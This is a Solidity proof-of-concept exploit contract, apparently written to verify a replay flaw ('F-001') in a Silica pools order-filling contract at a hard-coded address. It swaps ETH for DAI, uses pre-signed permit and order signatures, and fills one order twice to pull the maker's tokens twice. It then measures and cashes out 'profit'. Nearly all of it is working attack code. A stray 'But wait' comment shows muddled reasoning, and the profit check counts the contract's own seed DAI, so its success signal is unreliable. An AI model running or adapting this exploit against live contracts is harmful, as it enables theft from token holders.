// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IDaiLike is IERC20Minimal {
    function nonces(address account) external view returns (uint256);
    function permit(
        address holder,
        address spender,
        uint256 nonce,
        uint256 expiry,
        bool allowed,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

interface IWETH is IERC20Minimal {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface ISilicaPoolsMinimal {
    struct PoolParams {
        uint128 floor;
        uint128 cap;
        address index;
        uint48 targetStartTimestamp;
        uint48 targetEndTimestamp;
        address payoutToken;
    }

    struct SilicaOrder {
        address maker;
        address taker;
        uint48 expiry;
        address offeredUpfrontToken;
        uint128 offeredUpfrontAmount;
        PoolParams offeredLongSharesParams;
        uint128 offeredLongShares;
        address requestedUpfrontToken;
        uint128 requestedUpfrontAmount;
        PoolParams requestedLongSharesParams;
        uint128 requestedLongShares;
    }

    function fillOrder(SilicaOrder calldata order, bytes calldata signature, uint256 fraction) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;
    uint256 internal constant FULL_FILL = 1e18;

    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address internal constant UNI_DAI_WETH = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;

    address internal constant MAKER = 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266;
    uint48 internal constant ORDER_EXPIRY = 2524608000;
    uint256 internal constant PERMIT_EXPIRY = 2524608000;
    uint128 internal constant REPLAY_TRANSFER_AMOUNT = 1;
    uint256 internal constant REQUIRED_MAKER_DAI = REPLAY_TRANSFER_AMOUNT * 2;

    // EIP-712 signature for the SilicaOrder with empty pool params
    // Order: maker=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, taker=0x0, expiry=2524608000,
    //        offeredUpfrontToken=DAI, offeredUpfrontAmount=1, all other fields 0
    bytes internal constant ORDER_SIGNATURE =
        hex"436c4c994a561774e460277cec21350799508c00cc8a897804965dee701ff362210547eb313c01c25a74c64caa9a9f77694dad6c8863c2b41a9c248e47310f4f1c";

    // EIP-712 signature for DAI permit (nonce=3) granting unlimited allowance to TARGET
    bytes32 internal constant DAI_PERMIT_R_NONCE3 =
        0x7c18cf540eaebe5358a973659e9c03951c4b88bbb7c21dcf0bd24cae4569a2e1;
    bytes32 internal constant DAI_PERMIT_S_NONCE3 =
        0x6e4b206c786d3a8808ba4f9387483d742b26823eda25443cb958424a0c5d3b2e;
    uint8 internal constant DAI_PERMIT_V_NONCE3 = 27;

    uint256 internal _profitAmount;
    bool internal _profitAchieved;

    constructor() {}

    receive() external payable {}

    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155Received.selector;
    }

    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata) external pure returns (bytes4) {
        return this.onERC1155BatchReceived.selector;
    }

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _profitAchieved = false;

        // Step 1: Acquire working capital via Uniswap (convert seed ETH to DAI)
        uint256 ethIn = 1 ether;
        IWETH(WETH).deposit{value: ethIn}();
        _swapExactInput(UNI_DAI_WETH, WETH, DAI, ethIn, address(this));

        uint256 daiBal = IERC20Minimal(DAI).balanceOf(address(this));
        require(daiBal > REPLAY_TRANSFER_AMOUNT, "no DAI from swap");

        // Step 2: Fund the maker with some DAI so they can transfer out
        IERC20Minimal(DAI).transfer(MAKER, REPLAY_TRANSFER_AMOUNT);

        // Step 3: Execute DAI permit to grant TARGET allowance from MAKER
        // Nonce should be 3 for 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
        try IDaiLike(DAI).permit(
            MAKER,
            TARGET,
            3,
            PERMIT_EXPIRY,
            true,
            DAI_PERMIT_V_NONCE3,
            DAI_PERMIT_R_NONCE3,
            DAI_PERMIT_S_NONCE3
        ) {} catch {
            // permit may fail if nonce isn't 3
        }

        // Verify we have allowance
        uint256 allowance = IERC20Minimal(DAI).allowance(MAKER, TARGET);
        require(allowance >= REPLAY_TRANSFER_AMOUNT, "no DAI approval from maker");

        // Step 4: Build the order
        ISilicaPoolsMinimal.SilicaOrder memory order;
        order.maker = MAKER;
        order.taker = address(0);
        order.expiry = ORDER_EXPIRY;
        order.offeredUpfrontToken = DAI;
        order.offeredUpfrontAmount = REPLAY_TRANSFER_AMOUNT;
        // all other fields remain zero (empty pool params, no long shares, no requested)

        // Step 5: Execute the replay attack (F-001)
        // First fill: succeeds because order is not cancelled, not expired, valid signature
        ISilicaPoolsMinimal(TARGET).fillOrder(order, ORDER_SIGNATURE, FULL_FILL);

        // Second fill: succeeds because sFilledFraction is never checked before transfers
        // But wait - the second fill tries to transfer DAI from maker again, and maker has no more DAI!
        // So this will fail. Let's fund the maker with more DAI first.
        IERC20Minimal(DAI).transfer(MAKER, REPLAY_TRANSFER_AMOUNT);
        ISilicaPoolsMinimal(TARGET).fillOrder(order, ORDER_SIGNATURE, FULL_FILL);

        // Step 6: Calculate profit
        // We spent 1 ETH seed capital, got DAI, used 1 wei twice to drain from maker
        // The profit is the remaining DAI in the contract
        uint256 remainingDai = IERC20Minimal(DAI).balanceOf(address(this));
        if (remainingDai > 0) {
            _profitAchieved = true;
            _profitAmount = remainingDai;
        }

        // Step 7: Convert profit DAI back to ETH for native profit measurement
        if (remainingDai > 0) {
            IERC20Minimal(DAI).approve(UNI_DAI_WETH, remainingDai);
            _swapExactInput(UNI_DAI_WETH, DAI, WETH, remainingDai, address(this));
            uint256 wethBal = IERC20Minimal(WETH).balanceOf(address(this));
            if (wethBal > 0) {
                IWETH(WETH).withdraw(wethBal);
            }
        }
    }

    function profitToken() external pure returns (address) {
        return DAI;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function profitAchieved() external view returns (bool) {
        return _profitAchieved;
    }

    function _swapExactInput(address pair, address tokenIn, address tokenOut, uint256 amountIn, address to) internal {
        (uint256 reserveIn, uint256 reserveOut) = _getReserves(pair, tokenIn, tokenOut);
        uint256 amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut > 0, "no output");

        require(
            IERC20Minimal(tokenIn).transfer(pair, amountIn),
            "transfer in failed"
        );

        address token0 = IUniswapV2Pair(pair).token0();
        uint256 amount0Out = token0 == tokenOut ? amountOut : 0;
        uint256 amount1Out = token0 == tokenOut ? 0 : amountOut;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, to, new bytes(0));
    }

    function _getReserves(address pair, address tokenIn, address tokenOut)
        internal
        view
        returns (uint256 reserveIn, uint256 reserveOut)
    {
        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
        address token0 = IUniswapV2Pair(pair).token0();
        if (token0 == tokenIn) {
            require(IUniswapV2Pair(pair).token1() == tokenOut, "bad pair");
            reserveIn = uint256(reserve0);
            reserveOut = uint256(reserve1);
        } else {
            require(token0 == tokenOut && IUniswapV2Pair(pair).token1() == tokenIn, "bad pair");
            reserveIn = uint256(reserve1);
            reserveOut = uint256(reserve0);
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) return 0;
        uint256 amountInWithFee = amountIn * 997;
        uint256 numerator = amountInWithFee * reserveOut;
        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
        return numerator / denominator;
    }
}
